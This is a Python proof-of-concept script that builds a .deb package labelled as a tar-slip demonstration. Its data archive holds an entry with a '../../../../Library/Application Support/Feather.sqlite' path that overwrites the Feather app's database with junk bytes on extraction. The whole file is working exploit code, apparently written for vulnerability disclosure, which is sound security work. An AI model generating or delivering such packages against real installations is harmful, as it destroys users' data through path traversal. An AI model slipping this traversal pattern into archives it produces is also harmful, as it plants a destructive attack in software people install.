#!/usr/bin/env python3

import tarfile
import gzip
import io
import struct
import os

def create_ar_archive(files: list[tuple[str, bytes]]) -> bytes:
    ar = b"!<arch>\n"

    for name, content in files:
        name_bytes = name.encode().ljust(16)[:16]
        mtime = b"0".ljust(12)
        uid = b"0".ljust(6)
        gid = b"0".ljust(6)
        mode = b"100644".ljust(8)
        size = str(len(content)).encode().ljust(10)
        magic = b"\x60\x0a"

        ar += name_bytes + mtime + uid + gid + mode + size + magic
        ar += content

        if len(content) % 2 == 1:
            ar += b"\n"

    return ar

def create_malicious_tar() -> bytes:

    tar_buffer = io.BytesIO()

    with tarfile.open(fileobj=tar_buffer, mode='w') as tar:

        malicious_path = "../../../../Library/Application Support/Feather.sqlite"

        corrupt_db = b"CORRUPT_BY_POC_TARSLIP_VULNERABILITY\x00" * 100

        info = tarfile.TarInfo(name=malicious_path)
        info.size = len(corrupt_db)
        info.mode = 0o644

        tar.addfile(info, io.BytesIO(corrupt_db))

    return tar_buffer.getvalue()

def main():
    print("Creating malicious PoC .deb file...")

    debian_binary = b"1.0\n"

    control_tar_buffer = io.BytesIO()
    with tarfile.open(fileobj=control_tar_buffer, mode='w') as tar:
        control_content = b"""Package: feather.poc.tarslip
Name: TarSlip PoC
Version: 1.0
Architecture: iphoneos-arm
Description: PoC demonstrating tar slip path traversal
Author: Jacob Prezant
"""
        info = tarfile.TarInfo(name="control")
        info.size = len(control_content)
        tar.addfile(info, io.BytesIO(control_content))

    control_tar = control_tar_buffer.getvalue()
    control_tar_gz = gzip.compress(control_tar)

    data_tar = create_malicious_tar()
    data_tar_gz = gzip.compress(data_tar)

    deb_content = create_ar_archive([
        ("debian-binary", debian_binary),
        ("control.tar.gz", control_tar_gz),
        ("data.tar.gz", data_tar_gz),
    ])

    with open("tarslip_poc.deb", "wb") as f:
        f.write(deb_content)

    print(f"Created: tarslip_poc.deb ({len(deb_content)} bytes)")
    print(f"Warning: this will wreck your Feather")

if __name__ == "__main__":
    main()
